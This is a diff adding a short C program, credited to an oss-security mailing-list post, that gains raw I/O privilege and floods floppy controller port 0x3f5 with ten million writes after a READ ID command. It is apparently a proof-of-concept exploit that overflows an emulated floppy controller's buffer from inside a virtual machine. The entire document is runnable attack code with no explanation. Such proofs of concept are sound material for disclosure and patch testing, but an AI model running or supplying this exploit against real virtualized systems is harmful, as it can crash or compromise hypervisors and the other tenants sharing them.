@@ -1,0 +1,14 @@
+// Source: https://marc.info/?l=oss-security&m=143155206320935&w=2
+
+#include <sys/io.h>
+
+#define FIFO 0x3f5
+
+int main() {
+        int i;
+        iopl(3);
+
+        outb(0x0a,0x3f5); /* READ ID */
+        for (i=0;i<10000000;i++)
+                outb(0x42,0x3f5); /* push */
+}
